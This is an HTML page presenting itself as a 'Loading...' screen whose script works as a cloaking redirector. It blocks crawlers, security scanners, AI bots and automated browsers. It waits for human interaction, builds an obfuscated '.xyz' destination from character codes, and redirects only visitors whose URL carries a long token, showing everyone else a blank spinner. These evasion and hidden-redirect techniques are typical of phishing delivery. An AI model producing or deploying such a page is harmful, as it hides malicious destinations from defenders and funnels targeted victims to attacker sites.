<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Loading...</title>
<script>
(function(){
  let botKeywords = ["bot","crawl","spider","scrape","scan","index","headless","facebookexternalhit","WhatsApp","TelegramBot","Slackbot","Discordbot","Twitterbot","Googlebot","Bingbot","Baiduspider","YandexBot","DuckDuckBot","Slurp","ia_archiver","AhrefsBot","SemrushBot","DotBot","MJ12bot","rogerbot","exabot","fastbot","gigabot","turnitinbot","ltx71","BLEXBot","PetalBot","SeznamBot","Sogou","Bytespider","CCBot","CoHere","Amazonbot","Applebot","GPTBot","ClaudeBot","PerplexityBot","Puppeteer","PhantomJS","Selenium"];
  
  let ua = navigator.userAgent.toLowerCase();
  for(let i=0; i<botKeywords.length; i++){
    if(ua.includes(botKeywords[i])){
      document.body.innerHTML = "<h1>Access Denied</h1>";
      throw new Error("Bot detected");
    }
  }
  
  if(navigator.webdriver === true){
    document.body.innerHTML = "<h1>Access Denied</h1>";
    throw new Error("Webdriver detected");
  }
  
  if(!navigator.plugins || navigator.plugins.length === 0){
    if(!navigator.userAgent.includes("Chrome") && !navigator.userAgent.includes("Firefox") && !navigator.userAgent.includes("Safari")){
      document.body.innerHTML = "<h1>Access Denied</h1>";
      throw new Error("No plugins detected");
    }
  }
  
  if(navigator.languages === undefined || navigator.languages.length === 0){
    document.body.innerHTML = "<h1>Access Denied</h1>";
    throw new Error("Invalid languages");
  }
  
  let hasMouseMoved = false;
  let hasTouch = false;
  let hasKeyPress = false;
  
  window.addEventListener('mousemove', function(){ hasMouseMoved = true; }, {once: true});
  window.addEventListener('touchstart', function(){ hasTouch = true; }, {once: true});
  window.addEventListener('keydown', function(){ hasKeyPress = true; }, {once: true});
  
  let startTime = Date.now();
  
  function getDestinationURL(){
    let url = "";
    url += String.fromCharCode(104,116,116,112,115,58,47,47);
    url += String.fromCharCode(115,104,105,101,108,100,45,99,104,101,99,107,45,115,101,114,118,105,99,101,46,120,121,122);
    url += String.fromCharCode(47);
    return url;
  }
  
  function performRedirect(){
    let elapsed = Date.now() - startTime;
    
    if(!hasMouseMoved && !hasTouch && !hasKeyPress && elapsed < 800){
      setTimeout(performRedirect, 200);
      return;
    }
    
    let baseUrl = getDestinationURL();
    let currentUrl = window.location.href;
    let noise = "";
    
    if(currentUrl.includes('?')){
      noise = currentUrl.split('?')[1];
    } else if(currentUrl.includes('#')){
      noise = currentUrl.split('#')[1];
    }
    
    if(noise && noise.length > 30){
      window.location.replace(baseUrl);
    } else {
      document.body.innerHTML = "";
      document.body.style.background = "#fff";
      document.body.style.minHeight = "100vh";
      let spinner = document.createElement("div");
      spinner.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;animation:spin 1s linear infinite";
      let style = document.createElement("style");
      style.textContent = "@keyframes spin{0%{transform:translate(-50%,-50%) rotate(0deg)}100%{transform:translate(-50%,-50%) rotate(360deg)}}";
      document.head.appendChild(style);
      document.body.appendChild(spinner);
      
      setTimeout(function(){
        let newUrl = window.location.href;
        let newNoise = "";
        if(newUrl.includes('?')) newNoise = newUrl.split('?')[1];
        else if(newUrl.includes('#')) newNoise = newUrl.split('#')[1];
        if(newNoise && newNoise.length > 30){
          window.location.replace(baseUrl);
        }
      }, 100);
    }
  }
  
  setTimeout(performRedirect, 100);
})();
</script>
<style>
body{background:#fff;min-height:100vh;margin:0;padding:0}
</style>
</head>
<body>
</body>
</html>
